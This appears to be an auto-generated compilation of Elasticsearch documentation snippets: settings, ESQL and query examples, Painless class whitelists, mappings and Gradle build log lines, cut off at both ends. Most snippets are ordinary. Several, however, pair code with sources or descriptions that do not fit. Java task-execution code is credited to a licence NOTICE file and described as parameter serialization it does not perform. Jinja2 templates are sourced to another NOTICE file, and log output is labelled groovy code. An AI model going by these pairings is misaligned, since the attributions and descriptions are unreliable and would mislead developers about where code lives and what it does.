NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n```\n\n----------------------------------------\n\nTITLE: Configuring Write Thread Pool in Elasticsearch\nDESCRIPTION: Example showing how to configure the write thread pool by setting its size parameter in elasticsearch.yml\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/thread-pool-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nthread_pool:\n    write:\n        size: 30\n```\n\n----------------------------------------\n\nTITLE: Defining Runtime Field in Elasticsearch Mapping\nDESCRIPTION: Creates an index mapping with a runtime field that extracts the day of the week from a timestamp field. The script uses the emit function to return the calculated day name as a keyword type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/use-painless-scripts-in-runtime-fields.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index/\n{\n  \"mappings\": {\n    \"runtime\": {\n      \"day_of_week\": {\n        \"type\": \"keyword\",\n        \"script\": {\n          \"source\":\n          \"\"\"emit(doc['@timestamp'].value.dayOfWeekEnum\n          .getDisplayName(TextStyle.FULL, Locale.ROOT))\"\"\"\n        }\n      }\n    },\n    \"properties\": {\n      \"@timestamp\": {\"type\": \"date\"}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Mapping Character Filter to Convert Numerals\nDESCRIPTION: This example demonstrates using the mapping character filter with the analyze API to convert Hindu-Arabic numerals to Arabic-Latin equivalents. It transforms '٢٥٠١٥' to '25015' using a mapping configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-mapping-charfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"keyword\",\n  \"char_filter\": [\n    {\n      \"type\": \"mapping\",\n      \"mappings\": [\n        \"٠ => 0\",\n        \"١ => 1\",\n        \"٢ => 2\",\n        \"٣ => 3\",\n        \"٤ => 4\",\n        \"٥ => 5\",\n        \"٦ => 6\",\n        \"٧ => 7\",\n        \"٨ => 8\",\n        \"٩ => 9\"\n      ]\n    }\n  ],\n  \"text\": \"My license plate is ٢٥٠١٥\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining InstantiationException in Java\nDESCRIPTION: This snippet defines the java.lang.InstantiationException class, thrown when an application tries to create an instance of a class using the `newInstance` method in class `Class`, but the specified class object cannot be instantiated. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_40\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.InstantiationException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Selecting a Column by Name\nDESCRIPTION: Example of selecting a specific column from a table, where the column name is used as the output column name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT emp_no FROM emp LIMIT 1;\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Formatting Elements Group in Elasticsearch YAML\nDESCRIPTION: Includes inline formatting HTML elements like b, i, s, strong, em, span and others in the sanitization configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_27\n\nLANGUAGE: yaml\nCODE:\n```\n_formatting\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Image Elements in Elasticsearch YAML\nDESCRIPTION: Includes all image elements (both external and embedded) in the sanitization configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_30\n\nLANGUAGE: yaml\nCODE:\n```\nimg\nimg:all\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Documentation block for the 'field' parameter of an ESQL function. Notes that this is auto-generated documentation that should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_geoshape.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`field`\n:   Input value. The input can be a single- or multi-valued column or an expression.\n```\n\n----------------------------------------\n\nTITLE: Indexing a Polygon Shape in WKT Format\nDESCRIPTION: This example demonstrates indexing a polygon shape using Well-Known Text (WKT) format. The polygon is specified with a series of x,y coordinates in a string format, where the first and last points must match.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"POLYGON ((1000.0 -1001.0, 1001.0 -1001.0, 1001.0 -1000.0, 1000.0 -1000.0, 1000.0 -1001.0))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Certificate for Remote Cluster Client SSL in Elasticsearch\nDESCRIPTION: Setting to specify the path for the PEM encoded certificate associated with the private key for remote cluster client SSL. Can only be used when ssl.key is set.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_45\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.certificate\n```\n\n----------------------------------------\n\nTITLE: Configuring Merge Policy Factor\nDESCRIPTION: Dynamic setting for controlling the merge factor in tail merging operations. Defaults to 16.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/data-stream-lifecycle-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ndata_streams.lifecycle.target.merge.policy.merge_factor: 16\n```\n\n----------------------------------------\n\nTITLE: Serializing Task Parameters in Elasticsearch\nDESCRIPTION: Shows how task parameters are serialized to maintain immutability when tasks are sent between nodes. This method creates a copy of parameters by serializing and deserializing them, ensuring the parameters can't be modified after task creation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/text-structure/licenses/super-csv-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nTaskManager.registerTask(task);\ntry {\n    T taskResponse = task.execute(taskId, request, params, listener);\n    if (taskResponse == null) {\n        listener.onFailure(new NullPointerException(\"Task response cannot be null\"));\n        return null;\n    } else {\n        return taskResponse;\n    }\n} catch (Exception e) {\n    listener.onFailure(e);\n    return null;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining NamedGroupExtractor Class in Painless for Elasticsearch\nDESCRIPTION: Defines the NamedGroupExtractor class with a single method 'extract' that takes a String and returns a Map. This class is marked with @no_import, indicating it's a built-in class.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/runtime-fields-common/src/main/resources/org/elasticsearch/runtimefields/common_whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: Painless\nCODE:\n```\nclass org.elasticsearch.runtimefields.NamedGroupExtractor @no_import {\n    Map extract(String);\n}\n```\n\n----------------------------------------\n\nTITLE: Evaluating SQL Plugin JDBC Projects (File: build.gradle)\nDESCRIPTION: This snippet evaluates various JDBC related projects for the SQL plugin, covering multi-node, single-node, and security configurations with and without SSL, ensuring that the relevant Gradle files are appropriated for each test case.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_13\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:jdbc:multi-node\nEvaluating project ':x-pack:plugin:sql:qa:jdbc:multi-node' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/jdbc/multi-node/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:jdbc:no-sql\nEvaluating project ':x-pack:plugin:sql:qa:jdbc:no-sql' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/jdbc/no-sql/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:jdbc:security\nEvaluating project ':x-pack:plugin:sql:qa:jdbc:security' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/jdbc/security/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:jdbc:single-node\nEvaluating project ':x-pack:plugin:sql:qa:jdbc:single-node' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/jdbc/single-node/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:server:multi-cluster-with-security\nEvaluating project ':x-pack:plugin:sql:qa:server:multi-cluster-with-security' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/server/multi-cluster-with-security/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:server:multi-node\nEvaluating project ':x-pack:plugin:sql:qa:server:multi-node' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/server/multi-node/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:server:security\nEvaluating project ':x-pack:plugin:sql:qa:server:security' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/server/security/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:server:single-node\nEvaluating project ':x-pack:plugin:sql:qa:server:single-node' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/server/single-node/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:jdbc:security:with-ssl\nEvaluating project ':x-pack:plugin:sql:qa:jdbc:security:with-ssl' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/jdbc/security/with-ssl/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:jdbc:security:without-ssl\nEvaluating project ':x-pack:plugin:sql:qa:jdbc:security:without-ssl' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/jdbc/security/without-ssl/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:server:security:with-ssl\nEvaluating project ':x-pack:plugin:sql:qa:server:security:with-ssl' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/server/security/with-ssl/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:server:security:without-ssl\nEvaluating project ':x-pack:plugin:sql:qa:server:security:without-ssl' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/server/security/without-ssl/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Evaluating ESQL Plugin Server Projects (File: build.gradle)\nDESCRIPTION: This snippet focuses on the evaluation of the ESQL plugin server projects, handling multiple clusters and configurations for mixed and single-node setups, using specific Gradle build files for testing purposes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_12\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:esql:qa:server:mixed-cluster\nEvaluating project ':x-pack:plugin:esql:qa:server:mixed-cluster' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/esql/qa/server/mixed-cluster/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:esql:qa:server:multi-clusters\nEvaluating project ':x-pack:plugin:esql:qa:server:multi-clusters' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/esql/qa/server/multi-clusters/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:esql:qa:server:multi-node\nEvaluating project ':x-pack:plugin:esql:qa:server:multi-node' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/esql/qa/server/multi-node/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:esql:qa:server:single-node\nEvaluating project ':x-pack:plugin:esql:qa:server:single-node' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/esql/qa/server/single-node/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Embedded Images in Elasticsearch YAML\nDESCRIPTION: Includes only embedded images in the sanitization configuration. These images can only use the cid: URL protocol in their src attribute.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_31\n\nLANGUAGE: yaml\nCODE:\n```\nimg:embedded\n```\n\n----------------------------------------\n\nTITLE: Setting SMTP Timeout in Elasticsearch YAML\nDESCRIPTION: Configures the socket read timeout for SMTP connections. Defaults to two minutes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.timeout\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiplexer Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to set up a multiplexer token filter in Elasticsearch index settings. It creates an analyzer that uses the multiplexer filter with lowercase and porter stem filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-multiplexer-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /multiplexer_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"my_multiplexer\" ]\n        }\n      },\n      \"filter\": {\n        \"my_multiplexer\": {\n          \"type\": \"multiplexer\",\n          \"filters\": [ \"lowercase\", \"lowercase, porter_stem\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating ZIP Archive for Large Plugins in Shell\nDESCRIPTION: Shell command to create a ZIP archive for plugins larger than 5GB, ensuring the descriptor file is placed at the top of the archive for proper processing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-custom-bundles.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nzip -r name-of-plugin.zip name-of-descriptor-file.properties *\n```\n\n----------------------------------------\n\nTITLE: Null Comparison Equality Not Equals Examples\nDESCRIPTION: Demonstrates null-safe equality not equals operations, comparing null values with objects and other null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_20\n\nLANGUAGE: painless\nCODE:\n```\nObject a = null;\nObject b = null;\nboolean c = a == null;\nc = a == b;\nb = new Object();\nc = a == b;\n```\n\n----------------------------------------\n\nTITLE: Indexing and searching annotated text in Elasticsearch\nDESCRIPTION: Demonstrates indexing documents with annotated text and performing a term query to search for specific annotations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text-usage.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n# Example documents\nPUT my-index-000001/_doc/1\n{\n  \"my_field\": \"[Beck](Beck) announced a new tour\"\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"my_field\": \"[Jeff Beck](Jeff+Beck&Guitarist) plays a strat\"\n}\n\n# Example search\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"term\": {\n        \"my_field\": \"Beck\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Input Document for Community ID Processor\nDESCRIPTION: Sample input document containing network flow data that will be processed by the Community ID processor. It includes source and destination IP addresses and ports, as well as the transport protocol.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/community-id-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"_source\": {\n    \"source\": {\n      \"ip\": \"123.124.125.126\",\n      \"port\": 12345\n    },\n    \"destination\": {\n      \"ip\": \"55.56.57.58\",\n      \"port\": 80\n    },\n    \"network\": {\n      \"transport\": \"TCP\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Monitor Rollup Privilege\nDESCRIPTION: Read-only access for viewing rollup jobs and their capabilities. Not available in serverless deployments\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\nmonitor_rollup\n```\n\n----------------------------------------\n\nTITLE: EVAL Command with Unnamed Column in ESQL\nDESCRIPTION: An example of using the EVAL command without specifying a column name. The new column name becomes the expression itself.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/eval.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nheight*3.281\n```\n\n----------------------------------------\n\nTITLE: COMPLEMENT Operator Examples\nDESCRIPTION: Examples showing the tilde operator which negates the shortest following pattern, available when the COMPLEMENT flag is enabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_13\n\nLANGUAGE: text\nCODE:\n```\na~bc   # matches 'adc' and 'aec' but not 'abc'\n```\n\n----------------------------------------\n\nTITLE: Extracting Maximum Y-Coordinate Using ST_YMAX in Elasticsearch ESQL\nDESCRIPTION: This ESQL query demonstrates the usage of ST_YMAX along with other geospatial functions to extract the maximum y-coordinate (latitude) from airport city boundaries. It also calculates the minimum and maximum x and y coordinates of the envelope surrounding the city boundary.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_ymax.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)\n| KEEP abbrev, airport, xmin, xmax, ymin, ymax\n```\n\n----------------------------------------\n\nTITLE: Repeating String Values with REPEAT Function in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the REPEAT function in ESQL. It creates a new column 'triple_a' by repeating the value of column 'a' three times. The input is a single row with a string value, and the output shows the original and repeated values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/repeat.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"Hello!\"\n| EVAL triple_a = REPEAT(a, 3)\n```\n\n----------------------------------------\n\nTITLE: X-Pack Plugin Module Configuration\nDESCRIPTION: Configuration for various X-Pack plugins including async-search, autoscaling, security, and other core functionality modules\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_2\n\nLANGUAGE: Gradle\nCODE:\n```\nproject ':x-pack:plugin:async-search'\n```\n\n----------------------------------------\n\nTITLE: Term Query Result for Integer Range Field in Elasticsearch\nDESCRIPTION: The result of the term query on the integer_range field, showing a successful match with the document that has the expected_attendees range containing the value 12.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 13,\n  \"timed_out\": false,\n  \"_shards\" : {\n    \"total\": 2,\n    \"successful\": 2,\n    \"skipped\" : 0,\n    \"failed\": 0\n  },\n  \"hits\" : {\n    \"total\" : {\n        \"value\": 1,\n        \"relation\": \"eq\"\n    },\n    \"max_score\" : 1.0,\n    \"hits\" : [\n      {\n        \"_index\" : \"range_index\",\n        \"_id\" : \"1\",\n        \"_score\" : 1.0,\n        \"_source\" : {\n          \"expected_attendees\" : {\n            \"gte\" : 10, \"lt\" : 20\n          },\n          \"time_frame\" : {\n            \"gte\" : \"2015-10-31 12:00:00\", \"lte\" : \"2015-11-01\"\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Data Paths for Windows (Deprecated)\nDESCRIPTION: Shows the configuration of multiple data paths for Elasticsearch on Windows systems. This feature is deprecated as of version 7.13.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/path.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\npath:\n  data:\n    - \"C:\\\\Elastic\\\\Elasticsearch_1\"\n    - \"E:\\\\Elastic\\\\Elasticsearch_1\"\n    - \"F:\\\\Elastic\\\\Elasticsearch_3\"\n```\n\n----------------------------------------\n\nTITLE: Indexing a Pre-Indexed Shape in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to index a pre-indexed shape document with a `shape` field in Elasticsearch within the `shapes` index. It uses the `envelope` type with `coordinates` to represent a geographical area. This pre-indexed shape can be referenced by other queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-shape-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT /shapes/_doc/footprint\n{\n  \"geometry\": {\n    \"type\": \"envelope\",\n    \"coordinates\": [ [ 1355.0, 5355.0 ], [ 1400.0, 5200.0 ] ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: RRF Score Calculation Algorithm in Python\nDESCRIPTION: Core algorithm for calculating Reciprocal Rank Fusion scores. Takes multiple query results and combines them using a ranking constant k to determine document scores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nscore = 0.0\nfor q in queries:\n    if d in result(q):\n        score += 1.0 / ( k + rank( result(q), d ) )\nreturn score\n\n# where\n# k is a ranking constant\n# q is a query in the set of queries\n# d is a document in the result set of q\n# result(q) is the result set of q\n# rank( result(q), d ) is d's rank within the result(q) starting from 1\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Jinja2 Template Using System Environment Variable\nDESCRIPTION: Example of accessing environment variables in Jinja2 templates using the env function. This snippet shows how to retrieve the 'ES_JAVA_OPTS' environment variable with a default value if not set.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/tools/ansi-console/licenses/jansi-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n{{ env['ES_JAVA_OPTS'] }}\n```\n\n----------------------------------------\n\nTITLE: Documenting MD5 Hash Function in Elasticsearch ESQL\nDESCRIPTION: This code snippet provides a description of the MD5 hash function used in Elasticsearch's ESQL. It explains that the function computes the MD5 hash of the input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/md5.md#2025-04-21_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n**Description**\n\nComputes the MD5 hash of the input.\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Jinja2 Template Environment Variable with Default Value\nDESCRIPTION: An example showing how to use the default filter with environment variables in Jinja2 templates. It retrieves 'ES_JAVA_OPTS' or provides an empty string as fallback if the variable is not defined.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/tools/ansi-console/licenses/jansi-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n{{ env['ES_JAVA_OPTS'] | default('') }}\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for Redis Connector - Fetching Keys with Pattern\nDESCRIPTION: JSON configuration for advanced sync rules to fetch Redis database records where keys start with 'test1', 'test2', or 'test3'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_5\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"database\": 0,\n    \"key_pattern\": \"test[123]\"\n  }\n```\n\n----------------------------------------\n\nTITLE: Updating Bundle Version with Option 2 Method (cURL)\nDESCRIPTION: This snippet shows how to update the version of an existing bundle extension using the Option 2 method. It sets the version to '8.*' for compatibility with all 8.x versions of Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_14\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X POST \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"extension_type\" : \"bundle\",\n    \"name\": \"custom-bundle\",\n    \"version\" : \"8.*\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Whitelisting Classes for Boolean Field Scripts in Elasticsearch\nDESCRIPTION: This code defines a whitelist for boolean-valued runtime fields in Elasticsearch. The 'BooleanFieldScript' and its nested 'Factory' class are listed, which are necessary for the Painless scripting environment to recognize and work with these classes. This setup is pivotal for scripts that deal with boolean fields in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.boolean_field.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.BooleanFieldScript @no_import {\n}\nclass org.elasticsearch.script.BooleanFieldScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Metadata Class for Reindexing Operations\nDESCRIPTION: This snippet defines the org.elasticsearch.script.Metadata class, which encapsulates metadata related to indexing operations in Elasticsearch. It includes methods for getting and setting various properties like index, ID, routing, and version. The class also contains methods to handle internal versioning for reindexing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.reindex.txt#2025-04-21_snippet_2\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.script.Metadata {\n    String getIndex()\n    void setIndex(String)\n    String getId()\n    void setId(String)\n    String getRouting()\n    void setRouting(String)\n    long getVersion()\n    void setVersion(long)\n    boolean org.elasticsearch.script.ReindexMetadata isVersionInternal()\n    void org.elasticsearch.script.ReindexMetadata setVersionToInternal()\n    String getOp()\n    void setOp(String)\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Advanced Role Descriptor with Global Permissions and Special Characters in Elasticsearch\nDESCRIPTION: This role descriptor includes cluster-level permissions, global application and profile management, index privileges with complex naming patterns, and run-as permissions with special characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/security/audit/logfile/audited_roles.txt#2025-04-22_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\"cluster\":[\"manage_ml\",\"grant_api_key\",\"manage_rollup\"],\"global\":{\"application\":{\"manage\":{\"applications\":[\"a+b+|b+a+\"]}},\"profile\":{},\"role\":{}},\"indices\":[{\"names\":[\"/. ? + * | { } [ ] ( ) \\\" \\\\/\",\"*\"],\"privileges\":[\"read\",\"read_cross_cluster\"],\"field_security\":{\"grant\":[\"almost\",\"all*\"],\"except\":[\"denied*\"]}}],\"applications\":[],\"run_as\":[\"//+a+\\\"[a]/\"],\"metadata\":{\"?list\":[\"e1\",\"e2\",\"*\"],\"some other meta\":{\"r\":\"t\"}}}\n```\n\n----------------------------------------\n\nTITLE: Term Query for Unsigned Long in Elasticsearch\nDESCRIPTION: This snippet demonstrates a term query for an unsigned long field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/unsigned-long.md#2025-04-22_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /my_index/_search\n{\n    \"query\": {\n        \"term\" : {\n            \"my_counter\" : 18446744073709551615\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating String Bit Length in ESQL\nDESCRIPTION: Demonstrates the use of BIT_LENGTH() function to calculate the bit length of city names, compared with regular LENGTH(). The query filters airports in India and shows both character length and bit length of city names. Since UTF-8 encoding is used, characters may occupy multiple bytes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/bit_length.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE country == \"India\"\n| KEEP city\n| EVAL fn_length = LENGTH(city), fn_bit_length = BIT_LENGTH(city)\n```\n\n----------------------------------------\n\nTITLE: Converting Long Fields to Strings in ESQL\nDESCRIPTION: Shows that converting long fields to strings preserves duplicates. The example includes creating an index with a long field, indexing documents with duplicate values, and using ESQL to convert the field to strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-multivalued-fields.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /mv\n{\n  \"mappings\": {\n    \"properties\": {\n      \"b\": {\"type\": \"long\"}\n    }\n  }\n}\n\nPOST /mv/_bulk?refresh\n{ \"index\" : {} }\n{ \"a\": 1, \"b\": [2, 2, 1] }\n{ \"index\" : {} }\n{ \"a\": 2, 